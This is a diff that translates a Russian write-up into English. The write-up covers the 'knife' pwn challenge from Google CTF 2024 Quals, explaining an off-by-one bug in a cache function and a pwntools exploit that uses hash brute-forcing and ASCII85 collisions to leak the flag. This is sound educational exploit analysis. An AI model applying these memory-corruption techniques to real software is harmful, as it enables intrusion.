@@ -1,27 +1,27 @@
 ---
 title: "knife | Google CTF 2024 Quals"
-description: Решение задания "knife" из категории pwn
-summary: Решение задания "knife" из категории pwn
-теги: ["writeup", "pwn", "off-by-one"]
+description: Writeup for the "knife" challenge from the pwn category
+summary: Writeup for the "knife" challenge from the pwn category
+tags: ["writeup", "pwn", "off-by-one"]
 date: 2024-06-25T21:12:56+03:00
 author: Lnevx
 draft: false
 ---
 
-# Описание
+# Description
 
 > We made a utility for converting between various encodings. We're afraid it might leak other
 > users' data though... Can you pwn it?
 
-Задание **knife** является четвертым по сложности заданием в категории pwn. Под конец соревнований
-оно имело 44 решения. Как можно заметить, задание несложное, однако для решения требуется предельная
-внимательность
+The **knife** chal is the fourth most difficult task in the pwn category. By the end of the
+competition, it had 44 solutions. As you can see, the task is simple, however, solving it
+requires extreme attention.
 
-# Решение
+# Solution
 
-## Анализ
+## Analysis
 
-Запустим `file` и `checksec`:
+Run `file` and `checksec`:
 
 ```sh
 $ file chal
@@ -32,7 +32,8 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   73 Symbols  No      0           3           chal
 ```
 
-Перед нами обычный нестрипнутый 64-битный ELF. Все защиты включены, кроме канарейки. Запустим бинарь:
+We are dealing with an ordinary unstripped 64-bit ELF. All protections are enabled except the
+canary. Let's run the binary:
 
 ```sh
 $ ./chal
@@ -59,11 +60,11 @@ Success. Result: AAAA
 Awaiting command...
 ```
 
-Интерфейс программы позволяет пользователю конвертировать текст между разными кодировками. Заметим,
-что в качестве примера она приводит 2 команды: декодирование `N2Qab` из ASCII 85, и кодирование
-зацензуренного **флага!** в HEX
+The program interface allows the user to convert text between different encodings. Note that it
+gives 2 commands as an example: decoding `N2Qab` from ASCII 85, and encoding the censored **flag!**
+in HEX
 
-### Декомпиляция
+### Decompilation
 
 #### `main`
 
@@ -119,13 +120,13 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Программа использует настоящее значение флага, при этом результат не выводится (только "censored")
+The program uses the real value of the flag, but the result is not output (only "censored")
 
 #### `command`
 
-Функция `command` довольно большая, поэтому рассмотрим ее по частям
+The `command` function is quite large, so let's look at it in parts
 
-##### Выбор декодера/энкодера
+##### Choosing decoder/encoder
 
 ```c {linenos=1}
 void __fastcall command(const char *decoder, const char *encoder, const char *src, int print_result)
@@ -178,10 +179,11 @@ void __fastcall command(const char *decoder, const char *encoder, const char *sr
   }
 ```
 
-Несмотря на большой перечень кодировок, предлагаемый программой, реализовано всего две - ASCII85 и HEX
+Despite the large list of encodings offered by the program, only two are implemented &ndash;
+ASCII85 and HEX
 
 <details>
-  <summary><code>encoders[]</code> и <code>decoders[]</code></summary>
+  <summary><code>encoders[]</code> and <code>decoders[]</code></summary>
 
 ```plain
 .data:0000000000005140 ; __int64 (__fastcall *encoders[6])()
@@ -208,7 +210,7 @@ void __fastcall command(const char *decoder, const char *encoder, const char *sr
 
 </details>
 
-##### Декодирование и кеширование
+##### Decoding and caching
 
 ```c {linenos=1,linenostart=49}
   dstlen = 1024LL;
@@ -241,18 +243,17 @@ void __fastcall command(const char *decoder, const char *encoder, const char *sr
   put(cache[cur_cache_idx].encoders, decoder, src, v6);
 ```
 
-Здесь происходит декодирование текста в plain, а также поиск ячейки в кеше, осуществляемый по
-sha256 от декодированной строки. Если такая ячейка не была найдена, то используется следующая по
-счету (если счетчик достигает конца кеша, он обнуляется). Затем, в кеш добавляются возможные
-результаты кодирования: исходная кодировка и текст, полученный на входе; plain кодировка и
-декодированная строка.
+Here, the text is decoded into plain, and a cache lookup of the cell is performed with sha256 of
+the decoded string. If no such cell is found, the next cell is used (if the counter reaches the
+end of the cache, it is reset to zero). Then, possible encoding results are added to the cache:
+the source encoding and the text passed as the input; plain encoding and the decoded string.
 
-Кэш состоит из 10 ячеек. Каждая ячейка имеет `char *` на sha256 от plain строки (ключ) и массив
-`char *[6]` записей вычисленных ранее результатов кодирования
+The cache consists of 10 cells. Each cell has a `char*` on sha256 of the plain string (key) and an
+array `char *[6]` of records previously computed encoding results
 
-![Значения кеша после запуска программы](default_cache.png)
+![Cache state after the program start](default_cache.png)
 
-##### Кодирование, кеширование, вывод
+##### Encoding, caching, output
 
 ```c {linenos=1,linenostart=77}
   if ( v13 )
@@ -307,24 +308,25 @@ void __fastcall put(char **cache, const char *encoder, const char *dst_enc, size
 }
 ```
 
-Каждая добавляемая в кеш запись получается путем конкатенации короткого названия кодировки (plain/a85/hex)
-и результата декодера/энкодера. Если такая запись уже есть, то ничего не происходит
+Each entry added to the cache is obtained by concatenating the encoding short name (plain/a85/hex)
+and the result of the decoder/encoder. If such an entry already exists, nothing happens
 
-Не трудно заметить, что в `put` присутствует ошибка Off-by-one, которая позволяет нам переехать
-первый QWORD следующей ячекйки кеша (по совместительству являющимся указателем на хеш sha256)
+It's not difficult to notice that there is an Off-by-one bug in the `put`, which allows us to
+overwrite the first QWORD of the next cache cell (which is also a pointer to the sha256 hash)
 
-## Эксплуатация
+## Exploitation
 
-Давайте заполним весь кеш, чтобы счетчик обнулился и выдал ячейку в начале кеша. Заполнив ячейку
-полностью, с помощью бага Off-by-one мы сможем переписать значение хеша следующей ячейки
-(содержащей флаг) хешем специальной строки. Теперь остается закодировать данную строку в plain,
-чтобы получить флаг из кеша.
+Let's fill the entire cache so that the counter will zero out and return a cell at the beginning
+of the cache. Having filled the cell completely, we can use the Off-by-one bug to overwrite the
+hash value of the next cell (containing the flag) with the precomputed hash of a special string.
+Now it remains to encode this string into plain to get the flag from the cache.
 
-### Выбор хеша SHA256
+### Choosing SHA256 hash
 
-Так как хеш переписывается строкой формата `название энкодера + результат кодирования`, то каждый
-символ названия и результата должен быть в HEX алфавите. Нам подходит только энкодер ASCII85
-(сокр. `a85`). Стоит отметить, что длина декодируемой строки должна быть кратна 5 (размеру группы)
+Since the hash is rewritten with a string in the format `encoder name + encoding result`, each
+character of the name and result must be in the HEX alphabet. Only the ASCII85 encoder (abbr.
+`a85`) is suitable for us. It is worth noting that the length of the decoded string must be a
+multiple of 5 (group size)
 
 ```python {linenos=1}
 from pwn import *
@@ -352,12 +354,12 @@ for s in product(ascii_letters, repeat=5):
 [*] Hash: a85b891727674ac83fa143bf4849b9a8e52550eafef891b3c7b01fd9d22ad5ef
 ```
 
-### Коллизия ASCII85
+### ASCII85 collision
 
-Так как нам доступно всего 2 декодера, а заполнить ячейку нужно 6-ю уникальными записями,
-необходимо придумать коллизию. ASCII85 позволяет кодировать одной группой переменное количество
-байт (от 1 до 4). Таким образом, разбив одну строку разными способами, мы получим разные строки в
-ASCII85
+Since we have only 2 decoders available, and we need to fill the cell with 6 unique entries, we
+need to come up with a collision. ASCII85 allows to encode a variable number of bytes (from 1
+to 4) in one group. Thus, splitting one string in different ways, we will get different strings
+in ASCII85
 
 ```sh
 Awaiting command...
@@ -374,7 +376,7 @@ plain a85 AAAA
 Success. Result: 5)w|K
 ```
 
-Разобьем строку "AAAAAAAAA" в 3 группы разных размеров:
+Let's split the string "AAAAAAAAA" into 3 groups of different sizes:
 
 ```python {linenos=1}
 def gen_collisions(patterns):
@@ -394,16 +396,16 @@ coll = gen_collisions([
 ])
 ```
 
-### Собираем вместе
+### Putting together
 
-Так как <a href="#hl-5-62" data-target="code-block">сравнение хешей</a> осуществляется функцией
-`memcmp`, мы можем спокойно дописать в конец хеша строку с коллизией. При этом кеш будет выглядеть
-так:
+Since <a href="#hl-5-62" data-target="code-block">hash comparison</a>  is performed by the function
+`memcmp`, we can safely add a string with a collision to the end of the hash. In this case, the
+cache will look like this:
 
-![Значения кеша после эксплуатации](cache_after_exploit.png)
+![Cache state after exploitation](cache_after_exploit.png)
 
 <details>
-  <summary>Эксплоит</summary>
+  <summary>Exploit</summary>
 
 ```python
 #!/usr/bin/env python3
@@ -508,7 +510,7 @@ coll = gen_collisions([
 
 io = start()
 
-# Fill cache to control first cache entry
+# Fill cache to control first entry
 for i in range(8):
     io.sendlineafter(MENU, b'plain plain ' + num(i))
 
@@ -523,4 +525,4 @@ io.interactive()
 
 </details>
 
-![Флаг сдан](flag_submitted.gif)
+![Flag was submitted](flag_submitted.gif)
